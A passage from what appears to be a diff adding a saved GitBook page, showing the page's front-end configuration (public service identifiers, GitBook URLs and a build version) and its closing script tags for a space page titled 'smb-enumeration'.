book.com/hooks/slack/oauth"},"sentry":{"url":"https://df403e1abd7046148b272790ec350ce0@sentry.io/193897"},"stripe":{"public_key":"pk_live_iPkbPsG28bjTrkbfHXUq0cA0","plans":{"startup_monthly":"plan_FpdWuSK3BgOldB","startup_yearly":"plan_FpdZWR4TLYnKYH","team_monthly":"plan_GAeDpGXRUSctoE","team_yearly":"plan_GAeDEVtig2ujYe","business_monthly":"plan_ERCJFVRMVGgjVZ","business_yearly":"plan_ERCJgSzm3Ui1ox"},"products":{"startup":"prod_Cd5mCUdVDfZSHY","business":"prod_DpiRtaS8dvrtrK","enterprise":"prod_DpMsO7RlzNd0Ty","legacy":"prod_FROhqd8l1W4Fwg","team":"prod_GAeD47cc905FaD"}},"algolia":{"appid":"Q9UGR6532T"},"clearbit":{"public_key":"pk_e1e4d94ae5385255f0fc7d76d4897ade"},"urls":{"api":"https://api-beta.gitbook.com","spaces":"https://gitbook-28427.firebaseapp.com","website":"https://app.gitbook.com","saml":"https://www.gitbook.com"},"domains":{"spaces":"gitbook.io","cookie":".gitbook.com"},"cdn":{"blobsurl":"https://gblobscdn.gitbook.com/","hosting_cname":"hosting.gitbook.io"},"logrocket":{"key":"fvjtqz/gitbook"},"version":"6.23.0","buildVersion":"6.23.0-b774e34.32947"},"props":{"ownerID":"-LhsLF5jwDfMzebaG_Lx","spaceID":"-LkvnWByFHssLOYr3_77","spaceName":"tryharder","basename":"","location":"/untitled/smb-enumeration"}};
+            </script>
+            <script id="__LOADABLE_REQUIRED_CHUNKS__" type="application/json" crossorigin="anonymous" charset="utf-8">[]</script>
+<script async data-chunk="space" src="https://gstatic.gitbook.com/js/111.80fcf4da.js" crossorigin="anonymous" charset="utf-8"></script>
+        </body>
+    </html>
+    
